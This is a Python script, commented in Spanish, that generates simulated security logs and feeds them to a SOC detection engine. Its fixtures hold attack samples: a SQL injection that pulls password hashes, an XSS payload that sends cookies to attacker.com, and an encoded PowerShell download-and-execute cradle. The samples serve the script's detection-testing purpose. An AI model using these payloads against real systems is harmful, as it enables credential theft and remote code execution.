# -*- coding: utf-8 -*-
"""
Generador y Simulador de Telemetría SOC y Logs de Seguridad.
Genera eventos de firewall, autenticación SSH, peticiones HTTP web y scripts maliciosos,
los pasa por el motor del SOC y registra los incidentes resultantes.
"""

import os
import random
import csv
from datetime import datetime, timedelta
from soc_engine.log_parser import LogParser
from soc_engine.threat_detector import ThreatDetector
from core.incident_manager import IncidentManager

def simulate_soc_activity(output_log_file: str = "simulators/sample_raw_logs.log"):
    os.makedirs(os.path.dirname(os.path.abspath(output_log_file)), exist_ok=True)
    
    ips_atacantes = ["185.220.101.5", "45.154.255.89", "103.22.182.19", "198.51.100.44", "200.89.45.12", "190.14.33.10"]
    usuarios = ["admin", "root", "carlos.m", "maria.l", "juan.p", "dba_user", "service_acc"]
    
    detector = ThreatDetector(brute_force_limit=3)
    incident_mgr = IncidentManager()
    
    generated_logs = []
    
    print("[Simulador SOC] Generando flujo de logs y eventos de seguridad...")

    # 1. Simular ataque de fuerza bruta SSH
    attacker = random.choice(ips_atacantes)
    for i in range(4):
        log_line = f"Sep 14 14:10:{10+i*2} srv-web-01 sshd[2451{i}]: Failed password for invalid user admin from {attacker} port {40000+i} ssh2"
        generated_logs.append(log_line)

    # 2. Simular inyección SQL en servidor web
    sqli_ip = random.choice(ips_atacantes)
    sqli_line = f'{sqli_ip} - - [14/Sep/2026:14:15:22 -0300] "GET /api/v1/users?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users HTTP/1.1" 200 4520'
    generated_logs.append(sqli_line)

    # 3. Simular XSS en servidor web
    xss_ip = random.choice(ips_atacantes)
    xss_line = f'{xss_ip} - - [14/Sep/2026:14:18:05 -0300] "GET /search?q=<script>document.location=\'http://attacker.com/steal?c=\'+document.cookie</script> HTTP/1.1" 403 120'
    generated_logs.append(xss_line)

    # 4. Simular ejecución PowerShell con Base64
    ps_line = "Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAv...' localuser=maria.l"
    generated_logs.append(ps_line)

    # 5. Guardar log crudo
    with open(output_log_file, "w", encoding="utf-8") as f:
        for l in generated_logs:
            f.write(l + "\n")
    print(f"[Simulador SOC] {len(generated_logs)} eventos crudos guardados en '{output_log_file}'.")

    # 6. Procesar a través del motor del SOC
    total_detected = 0
    for line in generated_logs:
        parsed = LogParser.parse_line(line)
        detected_incidents = detector.analyze_event(parsed)
        for inc in detected_incidents:
            inc_id = incident_mgr.add_incident(inc)
            total_detected += 1
            print(f"  [+] ALERTA SOC DETECTADA: [{inc_id}] {inc['title']} | Severidad: {inc['severity']} | MITRE: {inc['mitre_technique']}")

    print(f"[Simulador SOC] Detección finalizada. Total incidentes registrados en matriz: {total_detected}")

if __name__ == "__main__":
    simulate_soc_activity()
